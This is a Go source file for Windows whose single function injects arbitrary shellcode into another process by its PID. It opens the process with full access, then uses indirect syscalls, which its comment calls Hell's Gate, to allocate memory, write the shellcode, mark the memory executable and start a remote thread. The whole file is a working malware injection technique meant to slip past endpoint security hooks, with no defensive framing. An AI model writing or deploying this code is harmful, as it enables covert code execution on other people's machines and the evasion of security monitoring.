//go:build windows
package windows

import (
	"fmt"
	"unsafe"
)

// InjectShellcode injects shellcode into a target PID using Indirect Syscalls (Hell's Gate)
func InjectShellcode(pid uint32, shellcode []byte) error {
	// 1. Open target process
	handle, _, err := ProcOpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		0,
		uintptr(pid),
	)
	if handle == 0 {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer ProcCloseHandle.Call(handle)

	// 2. Allocate memory via NtAllocateVirtualMemory (Indirect Syscall)
	var remoteAddr uintptr
	regionSize := uintptr(len(shellcode))
	
	status, err := IndirectSyscall("NtAllocateVirtualMemory",
		handle,
		uintptr(unsafe.Pointer(&remoteAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if status != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed with status 0x%X: %v", status, err)
	}

	// 3. Write shellcode via NtWriteVirtualMemory (Indirect Syscall)
	var bytesWritten uintptr
	status, err = IndirectSyscall("NtWriteVirtualMemory",
		handle,
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if status != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed with status 0x%X: %v", status, err)
	}

	// 4. Change protection via NtProtectVirtualMemory
	var oldProtect uint32
	status, err = IndirectSyscall("NtProtectVirtualMemory",
		handle,
		uintptr(unsafe.Pointer(&remoteAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed with status 0x%X: %v", status, err)
	}

	// 5. Execute via NtCreateThreadEx (Indirect Syscall)
	var threadHandle uintptr
	status, err = IndirectSyscall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&threadHandle)),
		uintptr(0x1FFFFF), // THREAD_ALL_ACCESS
		0,
		handle,
		remoteAddr,
		0,
		0,
		0,
		0,
		0,
		0,
	)
	if status != 0 {
		return fmt.Errorf("NtCreateThreadEx failed with status 0x%X: %v", status, err)
	}
	defer ProcCloseHandle.Call(threadHandle)

	return nil
}
